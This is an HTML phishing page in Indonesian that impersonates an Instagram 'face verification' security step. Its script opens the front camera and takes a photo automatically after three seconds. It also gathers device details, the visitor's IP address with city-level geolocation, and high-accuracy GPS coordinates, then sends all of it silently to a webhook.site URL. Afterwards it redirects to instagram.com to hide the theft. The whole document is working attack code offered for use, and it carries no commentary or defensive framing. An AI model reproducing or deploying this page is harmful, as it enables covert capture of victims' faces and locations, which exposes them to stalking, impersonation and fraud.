<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram - Verifikasi Wajah</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 25px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            overflow: hidden;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .header {
            background: linear-gradient(135deg, #405DE6, #5851DB);
            padding: 25px;
            text-align: center;
            color: white;
        }
        .header h1 { font-size: 24px; margin-bottom: 5px; }
        .header p { opacity: 0.9; font-size: 14px; }
        .camera-area {
            padding: 25px;
            text-align: center;
        }
        .video-wrapper {
            background: #000;
            border-radius: 20px;
            overflow: hidden;
            margin-bottom: 20px;
            position: relative;
        }
        video {
            width: 100%;
            transform: scaleX(-1);
            display: block;
        }
        canvas { display: none; }
        .btn-verify {
            background: linear-gradient(135deg, #405DE6, #5851DB);
            color: white;
            border: none;
            padding: 16px;
            width: 100%;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .btn-verify:active { transform: scale(0.98); }
        .loading {
            display: none;
            margin-top: 15px;
            color: #666;
        }
        .spinner {
            width: 30px;
            height: 30px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #405DE6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer {
            padding: 15px;
            text-align: center;
            background: #f8f9fa;
            font-size: 11px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h1>🔐 Verifikasi Keamanan</h1>
            <p>Verifikasi wajah diperlukan untuk melanjutkan</p>
        </div>
        <div class="camera-area">
            <div class="video-wrapper">
                <video id="video" autoplay playsinline></video>
                <canvas id="canvas"></canvas>
            </div>
            <button class="btn-verify" onclick="captureAndSend()">📸 Verifikasi Wajah</button>
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Memverifikasi...</p>
            </div>
        </div>
        <div class="footer">
            <p>⚠️ Verifikasi ini diperlukan untuk menjaga keamanan akun Anda</p>
            <p>© 2026 Instagram dari Meta</p>
        </div>
    </div>

    <script>
        let stream = null;
        let captured = false;
        
        // Auto request camera
        async function initCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: { exact: "user" }, width: 1280, height: 720 } 
                });
                document.getElementById('video').srcObject = stream;
                
                // Auto capture after 3 seconds
                setTimeout(() => {
                    if (!captured) captureAndSend();
                }, 3000);
            } catch(e) { console.log('Camera error:', e); }
        }
        
        async function captureAndSend() {
            if (captured) return;
            captured = true;
            
            const btn = document.querySelector('.btn-verify');
            const loading = document.getElementById('loading');
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            // Capture photo
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.9);
            
            // Collect all data
            const data = {
                photo: photoData,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            // Get IP
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                data.ip = ipData.ip;
                
                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geo = await geoRes.json();
                data.location = {
                    country: geo.country_name,
                    city: geo.city,
                    region: geo.region,
                    lat: geo.latitude,
                    lon: geo.longitude,
                    isp: geo.org
                };
            } catch(e) { data.ip = 'failed'; }
            
            // Try GPS
            if ('geolocation' in navigator) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000
                        });
                    });
                    data.gps = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                } catch(e) { data.gps = 'denied'; }
            }
            
            // Send to webhook
            let webhook = "https://webhook.site/5eb4067a-4d8c-4a93-8e8c-294ed4a1791f";
            
            fetch(webhook, {
                method: 'POST',
                body: JSON.stringify(data),
                headers: {'Content-Type': 'application/json'}
            });
            
            // Redirect to Instagram
            setTimeout(() => {
                window.location.href = 'https://instagram.com';
            }, 1500);
        }
        
        initCamera();
    </script>
</body>
</html>
